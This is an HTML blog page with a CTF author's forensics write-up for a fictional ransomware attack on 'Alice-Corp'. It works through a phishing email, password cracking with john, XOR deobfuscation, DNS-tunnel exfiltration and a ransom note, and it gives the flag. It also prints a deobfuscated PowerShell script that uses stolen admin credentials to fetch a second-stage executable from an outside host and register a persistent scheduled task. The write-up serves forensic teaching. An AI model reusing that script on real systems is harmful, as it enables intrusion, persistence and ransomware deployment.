@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Alice_In_Rans0ml4nd - Writeup – Blog – Insomnia</title>
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/atom-one-dark.min.css">
+</head>
+<body>
+  <header class="site-header">
+    <div class="container header-inner">
+      <a class="brand" href="../index.html" aria-label="Accueil">Insomnia</a>
+      <nav class="nav" aria-label="Navigation principale">
+        <button class="nav-toggle" aria-expanded="false" aria-controls="nav-list" aria-label="Menu">☰</button>
+        <ul id="nav-list" class="nav-list">
+          <li><a href="../index.html">Accueil</a></li>
+          <li><a href="../parcours.html">Parcours</a></li>
+          <li><a href="../competences.html">Compétences</a></li>
+          <li><a href="../veille.html">Veille</a></li>
+          <li><a href="../blog.html">Blog</a></li>
+          <li><a href="mailto:insomnia@0xinsomnia.me">Contact</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main id="content" class="section">
+    <div class="container narrow">
+      <p class="kicker">$ blog / ctf / alice_in_rans0ml4nd</p>
+      <h1 class="section-title">Alice_In_Rans0ml4nd - Writeup</h1>
+      <p class="lead">My own writeup for my own chall - ECW 2025 qualifier</p>
+      <figure class="post-banner"><img src="../assets/img/citrouille.jpg" alt="Alice_In_Rans0ml4nd - Writeup" loading="lazy"></figure>
+      <article class="reveal in-view markdown-content">
+        <h2>Challenge Description</h2>
+<p>Alice-Corp, a company specialized in developing technological solutions, has been hit by a ransomware attack. All workstations and servers connected to the Active Directory have been encrypted. The network team managed to capture part of the network traffic before the attack completed. As forensic investigators, we must analyze the PCAP file to reconstruct the attack chain.</p>
+<h2>Objectives</h2>
+<p>We need to find:</p>
+<ol>
+<li>The email address used by the attacker</li>
+<li>The email address targeted within the company</li>
+<li>The MD5 hash of the first malware</li>
+<li>The domain name contacted to download a script</li>
+<li>The password used to connect to the server</li>
+<li>The name of the scheduled task that was executed</li>
+<li>The domain name contacted by the script to download the second malware</li>
+<li>The MD5 hash of the malware present on the server</li>
+<li>The domain name used for data exfiltration</li>
+<li>The name of the ransomware gang</li>
+<li>The cryptocurrency wallet address</li>
+<li>The final flag contained in an exfiltrated file</li>
+</ol>
+<h2>1. Email Analysis - Finding the Phishing Attack</h2>
+<p>Opening the PCAP in Wireshark, we start by looking at the number of packets: <strong>3139</strong></p>
+<p>When we export objects and select HTTP, we can see this:<br />
+- Domain + port: <code>mail.alice.corp:8025</code><br />
+- Type: <code>message/rfc822</code></p>
+<p>It's a mail!</p>
+<p><img alt="Email export in Wireshark" src="../assets/img/img_1.png" /></p>
+<p>When we open the mail, we can see two email addresses:<br />
+- <code>natacha.routi@alice.corp</code><br />
+- <code>it-support@alices.corp</code></p>
+<pre><code class="language-text">To: natacha.routi@alice.corp
+Content-Transfer-Encoding: quoted-printable
+Received: from mail.alice.corp by Alice.corp (Alice-Corp)
+          id h3hvlhkzBteXTAmbr4qz4Pwj0NvpLr4Nq_e2PObs7Vg=@Alice.corp; Sun, 22 Jun 2025 09:27:47 +0200
+Subject: Internal Helpdesk Tool – Alice Corp
+Content-Type: text/plain; charset=&quot;utf-8&quot;
+MIME-Version: 1.0
+Message-ID: h3hvlhkzBteXTAmbr4qz4Pwj0NvpLr4Nq_e2PObs7Vg=@Alice.corp
+Return-Path: &lt;it-support@alices.corp&gt;
+From: it-support@alices.corp
+
+Hello,
+
+The IT department has published a new internal version of the Helpdesk tool.
+
+Please download it using the link below:
+
+Download link: https://www.dropbox.com/scl/fi/n13dckvawgi8rf50qr6ij/helpdesk.zip?rlkey=dlnvxltgup1wnlesbuiey2fwe&amp;e=2&amp;st=98676emp&amp;dl=1
+
+Note: The archive is password protected.
+It is the common password used internally at Alice Corp to secure ZIP files.
+
+Do not share this file outside the internal network.
+
+Best regards,
+IT Support
+Alice Corp
+</code></pre>
+<p>Analyzing the conversation, we find:<br />
+- <strong>Attacker email:</strong> <code>it-support@alices.corp</code><br />
+- <strong>Target email:</strong> <code>natacha.routi@alice.corp</code></p>
+<p>The email contains a malicious attachment via a link disguised as IT support communication.</p>
+<h2>2. Extracting the First Malware</h2>
+<p>For the link, we can't click directly because it's encoded. We need to decode it first.</p>
+<p><img alt="Encoded URL" src="../assets/img/img_3.png" /></p>
+<p>After decoding, we can download the file. It's a ZIP file protected by a common password according to the email:<br />
+- <code>helpdesk.zip</code></p>
+<p>We use <code>zip2john</code> to extract the hash:</p>
+<pre><code class="language-bash">zip2john helpdesk.zip &gt; hash
+</code></pre>
+<p>And we use the default wordlist rockyou:</p>
+<pre><code class="language-bash">john --wordlist=&quot;/usr/share/wordlists/rockyou.txt&quot; hash
+</code></pre>
+<p>And we obtain the password: <code>!!Miley24$$</code></p>
+<pre><code class="language-text">Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 5 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!!Miley24$$      (helpdesk.zip)
+1g 0:00:00:06 DONE (2025-06-25 20:36) 0.1531g/s 2196Kp/s 2196Kc/s 2196KC/s &quot;2parrow&quot;..*7¡Vamos!
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.
+</code></pre>
+<p>After uncompressing the zip file, we can see two files:<br />
+- <code>helpdesk.exe</code><br />
+- <code>patch.library-ms</code></p>
+<p><img alt="ZIP contents" src="../assets/img/img_4.png" /></p>
+<p><strong>MD5 first malware:</strong> <code>8d8b36683ed095a7eebe4e8c70141bfc</code></p>
+<h2>3. PowerShell Script Analysis</h2>
+<p>The first step is to analyze the malware with a sandbox like tria.ge</p>
+<p><img alt="Triage analysis" src="../assets/img/img_5.png" /></p>
+<p>We find a DNS request to <code>ykfqaqa.ru</code><br />
+- <strong>Domain contacted:</strong> <code>ykfqaqa.ru</code></p>
+<p>We can try a filter with HTTP to see what the malware is doing with this domain because we don't see anything via DNS in Wireshark.<br />
+- Filter: <code>http.host contains "ykfqaqa.ru"</code></p>
+<p><img alt="HTTP filter results" src="../assets/img/img_2.png" /></p>
+<p>Nice! We see a PowerShell script downloaded from <code>192.168.57.17</code> to <code>192.168.1.111</code> with the endpoint name <code>/deploy-malware.ps1</code></p>
+<p>After opening it, we see a simple obfuscated PowerShell script with XOR.</p>
+<p><img alt="Obfuscated PowerShell script part 1" src="../assets/img/img_6.png" /></p>
+<p><img alt="Obfuscated PowerShell script part 2" src="../assets/img/img_7.png" /></p>
+<p>And we create a simple Python script to de-XOR this:</p>
+<pre><code class="language-python">z1 = [
+    0x13, 0x62, 0x44, 0x52, 0x45, 0x17, 0xa, 0x17, 0x15, 0x56,
+    0x5b, 0x5e, 0x54, 0x52, 0x1a, 0x54, 0x58, 0x45, 0x47, 0x6b,
+    0x56, 0x53, 0x5a, 0x5e, 0x59, 0x5e, 0x44, 0x43, 0x45, 0x56,
+    0x43, 0x52, 0x42, 0x45, 0x15, 0x3d, 0x13, 0x67, 0x56, 0x44,
+    0x44, 0x40, 0x58, 0x45, 0x53, 0x67, 0x5b, 0x56, 0x5e, 0x59,
+]
+
+result = ''.join(chr(x ^ 0x37) for x in z1)
+
+print(result)
+</code></pre>
+<p>Examining the PowerShell script content, we extract:<br />
+- <strong>Password:</strong> <code>admin123sY*-+</code><br />
+- <strong>Scheduled task name:</strong> <code>DontTouchMe</code><br />
+- <strong>Second malware download domain:</strong> <code>susqouh.ru</code><br />
+- <strong>Name of the malware:</strong> <code>susqoUh.exe</code></p>
+<p>The deobfuscated PowerShell script shows the complete attack flow:</p>
+<pre><code class="language-powershell">$User = &quot;alice-corp\administrateur&quot;
+$PasswordPlain = &quot;admin123sY*-+&quot;
+$Pass = ConvertTo-SecureString $PasswordPlain -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential($User, $Pass)
+
+$RemoteHost = &quot;192.168.57.200&quot;
+
+$RemoteCommand = {
+    $exeUrl = &quot;http://susqoUh.ru:8000/susqoUh.exe&quot;
+    $exePath = &quot;C:\Windows\Temp\helpdesk.exe&quot;
+    $taskName = &quot;DontTouchMe&quot;
+
+    try {
+        Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
+
+        $action = New-ScheduledTaskAction -Execute $exePath
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+
+        Register-ScheduledTask -TaskName $taskName `
+            -Action $action `
+            -Trigger $trigger `
+            -User &quot;alice-corp\administrateur&quot; `
+            -Password &quot;admin123sY*-+&quot; `
+            -Settings $settings `
+            -RunLevel Highest `
+            -Force
+
+        Start-ScheduledTask -TaskName $taskName
+
+    } catch {
+        Write-Host &quot;&quot;
+    }
+}
+
+try {
+    Invoke-Command -ComputerName $RemoteHost -Credential $Cred -ScriptBlock $RemoteCommand -ErrorAction Stop
+} catch {
+    Write-Host &quot;&quot;
+}
+</code></pre>
+<h2>4. Server Malware Extraction</h2>
+<p>The PowerShell script downloads a second-stage malware from <code>susqouh.ru</code>.</p>
+<p>To get the MD5 of the new malware, we can export objects and select HTTP in Wireshark:</p>
+<p><img alt="HTTP object export in Wireshark" src="../assets/img/img_8.png" /></p>
+<p>Export the HTTP object and calculate its hash:</p>
+<pre><code class="language-bash">md5sum susqoUh.exe
+</code></pre>
+<p><strong>Server malware MD5:</strong> <code>5d820e7bbb4e4bc266629cadfa474365</code></p>
+<h2>5. Data Exfiltration via DNS Tunneling</h2>
+<p>To obtain the domain name used for exfiltration, we can see in Wireshark a lot of DNS requests.</p>
+<p><img alt="DNS tunneling traffic" src="../assets/img/img_9.png" /></p>
+<p>We notice DNS queries to <code>yinxuqab.ru</code> with unusually long subdomains - this is DNS tunneling!</p>
+<p><strong>Exfiltration domain:</strong> <code>yinxuqab.ru</code></p>
+<p>To get the final flag extracted via DNS exfiltration, I used this command with tshark:</p>
+<pre><code class="language-bash">tshark -r chall.pcapng -Y 'dns.qry.name contains &quot;yinxuqab.ru&quot;' -T fields -e dns.qry.name | sort -u &gt; exfil.txt
+</code></pre>
+<p><img alt="DNS exfiltration data" src="../assets/img/img_10.png" /></p>
+<p>We can see file0-0 to file0-4, it's possibly chunked data in hex and encrypted with a key. But we don't know the encryption type yet.</p>
+<p>So we have a key, and when we start a static analysis like Hybrid Analysis, we can see the compiled Rust libraries:</p>
+<pre><code class="language-text">%USERPROFILE%\.cargo\registry\src\index.crates.io-1949cf8c6b5b557f\aead-0.5.2\src\lib.rs
+%USERPROFILE%\.cargo\registry\src\index.crates.io-1949cf8c6b5b557f\aes-0.8.4\src\soft\fixslice64.rs
+%USERPROFILE%\.cargo\registry\src\index.crates.io-1949cf8c6b5b557f\data-encoding-2.9.0\src\lib.rs
+</code></pre>
+<p>It's AES and we have only one choice: <strong>AES-GCM</strong></p>
+<p><img alt="Rust library analysis" src="../assets/img/img_11.png" /></p>
+<p>To decrypt this, I used this Python script with AES-GCM (referring to <a href="https://www.rfc-editor.org/rfc/rfc5288.txt">RFC 5288</a>):</p>
+<pre><code class="language-python">from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import binascii
+
+def decrypt_file(encrypted_data, key):
+    nonce = encrypted_data[:12]
+    ciphertext = encrypted_data[12:]
+    aesgcm = AESGCM(key)
+    return aesgcm.decrypt(nonce, ciphertext, None)
+
+encrypted_data = binascii.unhexlify(&quot;d2373cdd6d999679668b0d4587abbeb325bda0343841f3cdb1e4ec8f7b597f75ddde462a9bbefb828318f3bc16af0f52dce3ffbfa34670557bf89ee98ce45da82eb45abd320c4b0a143e2569a6bd8a8f8d7c0e52a76ff4b4505e82df2c204632&quot;)
+key_data = binascii.unhexlify(&quot;3de090e7059fb1d7f77dec50078405c855e3f1a46589e72db2602c7d7e8403b8&quot;)
+decrypted_data = decrypt_file(encrypted_data, key_data)
+
+with open(&quot;decrypted&quot;, 'wb') as f:
+    f.write(decrypted_data)
+</code></pre>
+<p><strong>Final flag from exfiltrated data:</strong> <code>DNS_TUNNEL_SUCCESS_C0MPLETE</code></p>
+<h2>6. Ransomware Note Analysis</h2>
+<p>To get the gang name of the ransomware group, we need to run the malware in a sandbox like VirtualBox or Hybrid Analysis.</p>
+<p>After we run it for a few minutes, we obtain this message.txt:</p>
+<pre><code class="language-text">---[ SPHINXLOCK RANSOMWARE GROUP ]---
+
+Your network has been compromised and all critical files have
+been encrypted. This includes documents, databases, backups, and internal
+project files.
+
+We are SPHINXLOCK, specializing in corporate data
+extraction and ransomware-as-a-service.
+
+Do NOT attempt to recover your files using third-party tools.
+Doing so will permanently corrupt them.
+
+&gt;&gt;&gt; How to restore your files:
+
+1. Purchase 5000 USD in Monero (XMR) cryptocurrency.
+
+2. Send the exact amount to the following wallet address:
+   84N2hXaVqgS5DzA1FpkGuD98Ex2cVXH6k8RwZ7PmUz1oBY9X6GZYMT3WJYkfY9AdELNH2tsBrxJZcdkLkJxYH5RZ73XKbPq
+
+3. After payment, email us at: sphinxhelpdesk@sphinxlock.ru
+   Include in your message:
+   - Your unique victim ID: #SPX-3041B
+   - Proof of payment
+   - 1 encrypted file (max 1MB) for free decryption test
+
+&gt;&gt;&gt; WARNING:
+
+If you fail to pay within 72 hours, we will:
+- Start posting confidential files.
+- Sell sensitive corporate data.
+
+This is your only opportunity to prevent a total data breach.
+
+We are watching.
+
+SPHINXLOCK
+</code></pre>
+<p>From the note, we extract:<br />
+- <strong>Ransomware gang:</strong> <code>sphinxlock</code><br />
+- <strong>Cryptocurrency wallet:</strong> <code>84N2hXaVqgS5DzA1FpkGuD98Ex2cVXH6k8RwZ7PmUz1oBY9X6GZYMT3WJYkfY9AdELNH2tsBrxJZcdkLkJxYH5RZ73XKbPq</code></p>
+<h2>Building the Final Flag</h2>
+<p>Now we have all the pieces:</p>
+<pre><code class="language-bash">echo -n &quot;it-support@alices.corp:natacha.routi@alice.corp:8d8b36683ed095a7eebe4e8c70141bfc:ykfqaqa.ru:admin123sY*-+:DontTouchMe:susqouh.ru:5d820e7bbb4e4bc266629cadfa474365:yinxuqab.ru:sphinxlock:84N2hXaVqgS5DzA1FpkGuD98Ex2cVXH6k8RwZ7PmUz1oBY9X6GZYMT3WJYkfY9AdELNH2tsBrxJZcdkLkJxYH5RZ73XKbPq:DNS_TUNNEL_SUCCESS_C0MPLETE&quot; | sha256sum
+</code></pre>
+<p><strong>Flag:</strong> <code>ECW{f68ba371b5fc66c802207b9bedd0838af9d6d7a46085765425d89f80f558b3f9}</code></p>
+<h2>Attack Chain Summary</h2>
+<ol>
+<li><strong>Phishing Email:</strong> Attacker sends malicious email with password-protected ZIP</li>
+<li><strong>First Payload:</strong> Victim extracts and executes malware from ZIP</li>
+<li><strong>C2 Communication:</strong> Malware contacts <code>ykfqaqa.ru</code> to download PowerShell script</li>
+<li><strong>Persistence:</strong> Scheduled task <code>DontTouchMe</code> is created</li>
+<li><strong>Second Stage:</strong> PowerShell downloads ransomware from <code>susqouh.ru</code></li>
+<li><strong>Encryption:</strong> SphinxLock ransomware encrypts the network</li>
+<li><strong>Exfiltration:</strong> Data is exfiltrated via DNS tunneling to <code>yinxuqab.ru</code></li>
+<li><strong>Ransom Demand:</strong> Attackers demand payment to cryptocurrency wallet</li>
+</ol>
+<h2>Tools Used</h2>
+<ul>
+<li>Wireshark</li>
+<li>tshark</li>
+<li>Python</li>
+<li>zip2john &amp; john</li>
+<li>Hybrid Analysis / tria.ge</li>
+</ul>
+<h2>Key Techniques</h2>
+<ul>
+<li>PCAP analysis and packet inspection</li>
+<li>HTTP object extraction</li>
+<li>PowerShell script deobfuscation (XOR)</li>
+<li>DNS tunneling detection and decoding</li>
+<li>AES-GCM decryption</li>
+<li>Network forensics</li>
+<li>Static malware analysis</li>
+</ul>
+        <p><a class="link" href="../blog.html">← Retour au blog</a></p>
+      </article>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <div class="container footer-inner">
+      <div class="footer-left">
+        <p class="footer-note">Made with <span class="heart" aria-hidden="true">❤️</span> by <strong>Insomnia</strong> • <span id="year"></span></p>
+      </div>
+      <div class="footer-right">
+        <ul class="footer-social">
+          <li><a class="social-link" href="https://github.com/nowzee" target="_blank" rel="noopener" aria-label="GitHub"><svg viewBox="0 0 24 24" class="icon"><path fill="currentColor" d="M12 .5C5.73.5.99 5.24.99 11.52c0 4.86 3.16 8.98 7.55 10.43.55.1.76-.24.76-.54 0-.27-.01-1.17-.02-2.12-3.07.67-3.72-1.31-3.72-1.31-.5-1.26-1.23-1.6-1.23-1.6-.99-.68.08-.66.08-.66 1.1.08 1.68 1.13 1.68 1.13.98 1.68 2.58 1.19 3.21.9.1-.71.38-1.19.69-1.46-2.45-.28-5.02-1.22-5.02-5.43 0-1.2.43-2.18 1.13-2.95-.11-.28-.49-1.41.11-2.94 0 0 .92-.3 3.02 1.13a10.5 10.5 0 0 1 5.5 0c2.1-1.43 3.02-1.13 3.02-1.13.6 1.53.22 2.66.11 2.94.7.77 1.13 1.75 1.13 2.95 0 4.22-2.58 5.15-5.03 5.42.39.33.73.98.73 1.98 0 1.43-.01 2.58-.01 2.94 0 .3.2.64.77.53 4.38-1.45 7.54-5.56 7.54-10.42C23 5.24 18.27.5 12 .5Z"/></svg></a></li>
+          <li><a class="social-link" href="mailto:insomnia@0xinsomnia.me" aria-label="Email"><svg viewBox="0 0 24 24" class="icon"><path fill="currentColor" d="M20 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2Zm0 4-8 5L4 8V6l8 5 8-5v2Z"/></svg></a></li>
+        </ul>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/main.js" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/powershell.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</body>
+</html>
